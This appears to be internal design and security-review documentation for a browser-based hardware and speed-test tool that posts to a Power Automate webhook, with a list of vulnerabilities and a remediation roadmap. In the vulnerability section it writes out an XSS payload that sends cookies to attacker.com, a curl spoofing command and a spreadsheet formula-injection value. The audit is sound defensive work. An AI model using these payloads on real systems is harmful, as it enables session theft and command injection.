Section 1

Project Overview

The Hardware Inspection Tool is a client-side single-page web application (SPA) built in vanilla HTML/CSS/JavaScript. It collects hardware specifications and network performance metrics from employee machines and submits the results to a Microsoft Power Automate workflow via a direct HTTPS POST.

There is no backend server. All logic runs in the browser or in locally executed scripts. The tool targets Windows, macOS, Linux, Android, and iOS platforms, using platform-specific collection methods on each.

Platform Detection

Detection uses the modern navigator.userAgentData.getHighEntropyValues(['platform']) API with a User-Agent string regex fallback:

// Preferred: UACH API (Chromium-based browsers)
const h = await navigator.userAgentData.getHighEntropyValues(['platform']);
// Returns: 'Windows' | 'macOS' | 'Android' | 'iOS' | 'Linux'

// Fallback: UA string regex
if (/Windows/.test(ua))   return 'Windows';
if (/iPhone|iPad/.test(ua)) return 'iOS';
if (/Android/.test(ua))  return 'Android';
if (/Mac OS X/.test(ua)) return 'macOS';
Section 3

End-to-End Data Flow

1 — User opens the page
Browser loads speedtest-webpage.html. JS checks URL params for ?hwready=1 and hardware fields (cpu, ram, os, model, netType, netSpeed). If present, populates the internal _hw object and shows the hardware banner.
2 — Platform detection & setup screen
On "Get Started", detectPlatform() runs and shows the matching setup div. Windows shows two options: auto-detect (BAT download) or manual entry form. macOS, Android, iOS show manual entry forms. Linux shows shell script instructions.
3 — Windows auto-detect path (BAT execution)
User downloads and runs run-speedtest.bat. The BAT calls PowerShell to decode a UTF-16LE base64 string and write it to %TEMP%\transpro-speedtest-<RANDOM>.ps1. PowerShell then executes the PS1, which collects hardware via WMI/CIM and NIC data via Get-NetAdapter, builds a URL-encoded query string, and opens the browser directly to speedtest-webpage.html?hwready=1&cpu=...&ram=...&os=...&model=...&netType=...&netSpeed=.... The temp PS1 is deleted after execution.
4 — Speed test execution
User fills in name (required), email, department, location. On submit, four async operations run in sequence: (a) fetch to ipapi.co/json/ for geolocation; (b) timed fetch of a 10 MB file from speed.cloudflare.com/__down?measId=... for download speed; (c) timed fetch POST of a 1 MB Uint8Array to speed.cloudflare.com/__up for upload speed; (d) 5 sequential Date.now()-timed requests to measure ping and compute jitter as the mean absolute deviation of RTTs.
5 — Payload assembly
A JSON object is built combining: user-entered fields, _hw hardware object, speed test results, ipapi.co geolocation, browser fingerprint (navigator.platform, navigator.hardwareConcurrency, navigator.deviceMemory, screen resolution, timezone, browser name/version).
6 — Webhook POST
fetch(CONFIG.webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }). On success (HTTP 200–299), results are rendered in the UI. On failure, an error message is displayed. No retry logic.
7 — Power Automate → SharePoint
Power Automate receives the JSON, maps fields to a SharePoint list, and writes the row. No response body is returned to the client beyond HTTP status.
Section 4

Platform Scripts — Technical Detail

Windows — BAT + Embedded PS1

The BAT file uses PowerShell's [System.IO.File]::WriteAllBytes() to decode the embedded base64 string (UTF-16LE encoded PS1) directly to a temp file, bypassing all string escaping issues:

set "TMP_PS1"=%TEMP%\transpro-speedtest-%RANDOM%.ps1
powershell -ExecutionPolicy Bypass -NoProfile -Command "[System.IO.File]::WriteAllBytes('%TMP_PS1%', [System.Convert]::FromBase64String('<base64>'))"
powershell -ExecutionPolicy Bypass -NoProfile -File "%TMP_PS1%"
del "%TMP_PS1%" 2>nul

The PS1 collects data using these WMI/CIM queries:

# CPU — name, core count, logical processor count
$cpu = Get-CimInstance Win32_Processor | Select-Object -First 1

# RAM — sum of physical memory banks in bytes → rounded to GB
$ramBytes = (Get-CimInstance Win32_PhysicalMemory | Measure-Object Capacity -Sum).Sum

# OS — caption string + build number
$os = Get-CimInstance Win32_OperatingSystem

# Model — manufacturer + model string from ComputerSystem
$cs = Get-CimInstance Win32_ComputerSystem

# NIC — first non-virtual, active adapter, sorted by link speed
$adapter = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.Virtual -eq $false } | Sort-Object LinkSpeed -Descending | Select-Object -First 1

# Wi-Fi detection — PhysicalMediaType or InterfaceDescription regex
$isWifi = $adapter.PhysicalMediaType -eq 'Native 802.11' -or $adapter.InterfaceDescription -match 'Wi.?Fi|Wireless|802\.11'

# SSID + signal strength via netsh
$wlan = (netsh wlan show interfaces) -join "`n"

Linux — Shell Script

The shell script (run-speedtest.sh) uses native Unix tools:

# CPU model
grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | xargs

# RAM total in GB
awk '/MemTotal/ { printf "%.0f GB", $2/1024/1024 }' /proc/meminfo

# OS description
lsb_release -ds 2>/dev/null || cat /etc/os-release | grep PRETTY_NAME

# Active NIC name via default route
ip route | awk '/default/ { print $5; exit }'

macOS, Android, iOS — Manual Entry

No scripts are executed. The user is shown a reference card illustrating where to find the data on their device, then fills in a form. On "Continue", the form values are written directly into the _hw JavaScript object in memory before navigating to the speed test screen.

External API Integrations

Cloudflare Speed Test Endpoints

TestEndpointMethodDetail
Downloadspeed.cloudflare.com/__down?measId=<id>GET10 MB response body. Speed = (10 * 8) / elapsed_seconds Mbps. Measured via performance.now().
Uploadspeed.cloudflare.com/__upPOST1 MB Uint8Array body. Speed = (1 * 8) / elapsed_seconds Mbps.
Ping / Jitterspeed.cloudflare.com/__down?measId=<id>GET5 sequential requests, minimal payload. RTT array → avg ping; jitter = mean absolute deviation of RTTs.

ipapi.co Geolocation

Single GET request to https://ipapi.co/json/. Returns JSON with the following fields used by the tool:

{
  "ip":         "203.0.113.45",
  "city":       "Montreal",
  "region":     "Quebec",
  "country_name": "Canada",
  "org":        "AS577 Bell Canada"
}

The ip and org fields are inserted into the DOM using innerHTML (see Security section §1).

Power Automate Webhook

HTTP POST to the hardcoded CONFIG.webhookURL. The endpoint is a Microsoft Power Automate instant flow with an HTTP trigger. Headers: Content-Type: application/json. No authentication token. See Section 7 for full payload schema.

Section 8

Security Vulnerabilities

High

1 — Webhook URL Exposed in Client Source

Location: speedtest-webpage.html — CONFIG.webhookURL, visible in browser DevTools.

Impact: Any person who opens the page can extract the full Power Automate endpoint URL and POST arbitrary JSON payloads to it — spoofing results, flooding the SharePoint list, or probing the flow for further exploitation. No network access beyond the public URL is required.

Attack vector: Browser DevTools → Sources → copy CONFIG.webhookURL → curl -X POST <url> -d '{"name":"fake",...}'

High

2 — No Submission Authentication

Location: Form submission logic — no token, session, or identity check of any kind.

Impact: Anyone — internal or external — can submit a result with any name, email, and data values. There is no way to distinguish a legitimate submission from a fabricated one in the SharePoint list.

High

3 — XSS via innerHTML with Third-Party API Data

Location: displayResults() function — ipapi.co fields (ip, org, city, region, country_name) inserted via innerHTML.

Impact: If ipapi.co is compromised or the response is intercepted (MITM on HTTP), a crafted API response containing <script> tags or event handler attributes executes arbitrary JavaScript in the user's browser under the page's origin.

Attack vector: DNS spoofing or BGP hijack of ipapi.co → inject <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)"> into org field.

Medium

4 — No Rate Limiting

Location: Submit button — disabled only during test execution; trivially bypassed via DevTools or scripted requests.

Impact: The webhook and SharePoint list can be flooded with automated submissions, exhausting Power Automate run limits or filling the SharePoint list with noise.

Medium

5 — No Input Validation or Sanitization

Location: Name, email, department, location fields — sent raw to the webhook.

Impact: Formula injection into SharePoint/Excel if the data is exported to a spreadsheet (e.g., =CMD|'/c calc'!A1 in the name field). Also enables stored XSS if results are ever rendered back in a web interface.

Medium

6 — Third-Party Data Dependency (ipapi.co)

Location: https://ipapi.co/json/ called client-side on every submission.

Impact: Every user's public IP address is sent to an external third-party service with no data processing agreement. Service downtime causes the speed test to fail or produce incomplete results. No control over retention or use of IP data.

Medium

7 — No Privacy / Data Consent Notice

Location: Entire application — no disclosure of data collected.

Impact: The tool collects name, email, public IP, ISP, physical location, device hardware specs, and browser fingerprint without informing users or obtaining consent. Non-compliant with PIPEDA (Canada) and potentially GDPR if used across borders.

Low

8 — No Content Security Policy (CSP)

Location: No Content-Security-Policy HTTP header or meta tag.

Impact: Without a CSP, an XSS attack (see §3) can load external scripts, exfiltrate data, or modify the DOM with no additional barrier. Increases blast radius of any injected script.

Low

9 — PowerShell Execution Policy Bypass

Location: run-speedtest.bat — -ExecutionPolicy Bypass flag.

Impact: The BAT instructs PowerShell to ignore the system execution policy, allowing unsigned scripts to run. If the BAT file itself is tampered with (e.g., supply chain via compromised hosting), the PS1 payload runs with user-level permissions without any OS-level script signing check.

Section 9

Improvement Roadmap

1

Move webhook URL to a server-side proxy

Deploy a thin backend endpoint (Azure Function, Cloudflare Worker, or WordPress REST route) that accepts the result payload and forwards it to Power Automate. The client never sees the webhook URL. Eliminates vulnerabilities §1 and §4 (rate limiting can be enforced at proxy level).

2

Add submission authentication

Require an SSO token (Azure AD / Microsoft 365) or a short-lived signed token issued per session by the proxy. Only authenticated Transpro users can submit. Eliminates vulnerability §2.

3

Replace innerHTML with textContent for all API-sourced data

Change element.innerHTML = apiValue to element.textContent = apiValue for all fields populated from ipapi.co. Add a DOMPurify sanitization pass as a secondary layer. Eliminates vulnerability §3.

4

Add Content Security Policy

Add a <meta http-equiv="Content-Security-Policy"> tag restricting script-src to 'self' and known CDN origins only. Also enforce at the web server level via HTTP header. Eliminates vulnerability §8 and reduces blast radius of §3.

5

Add input validation and sanitization

Validate name (text only, max length), email (RFC 5322 regex), department (allowlist), location (text only) before submission. Strip or reject formula characters (=, +, -, @ at field start). Eliminates vulnerability §5.

6

Replace ipapi.co with a self-hosted or proxied GeoIP lookup

Route the IP geolocation request through the same backend proxy (see §1 above), using a free MaxMind GeoLite2 database or the Cloudflare Workers cf.city object. No user IP data leaves the internal infrastructure. Eliminates vulnerability §6.

7

Add data consent notice

Add a one-time consent checkbox on the welcome screen listing all data collected (name, email, IP, hardware specs, location). Log consent timestamp in the SharePoint row. Eliminates vulnerability §7.

8

Code-sign the PowerShell script

Sign run-speedtest.ps1 with a Transpro code-signing certificate and change the BAT to use -ExecutionPolicy AllSigned. Prevents tampered scripts from executing. Eliminates vulnerability §9.
